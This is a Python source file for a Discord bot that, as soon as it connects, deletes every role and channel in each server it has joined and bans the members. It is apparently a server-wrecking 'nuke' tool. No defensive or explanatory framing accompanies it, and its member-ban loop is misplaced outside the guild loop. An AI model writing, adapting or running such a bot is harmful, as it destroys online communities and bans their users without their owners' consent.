import discord
from discord.utils import get
from discord.ext import commands

token = "T"

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(intents=intents)

@bot.event
async def on_ready():
    print("Bot is ready.")
    #Deletes everything in the server
    for guild in bot.guilds:
            #Deletes all roles avaliable
            for role in guild.roles:
                try:
                    if role != bot.user:
                        await role.delete()
                        print(f"{str(role).upper()} was deleted in guild {str(guild).upper()}")
                except:
                    pass
            #Deletes all channels avaliable
            for channel in guild.channels:
                await channel.delete()
                print(f"{str(channel).upper()} was deleted in guild {str(guild).upper()}.")
    for member in guild.members:
        try:
            if member != bot.user:
                await member.ban(reason=None)
                print(f"{str(member).upper()} was banned in guild {str(guild).upper()}.")
        except:
            pass

bot.run(token)
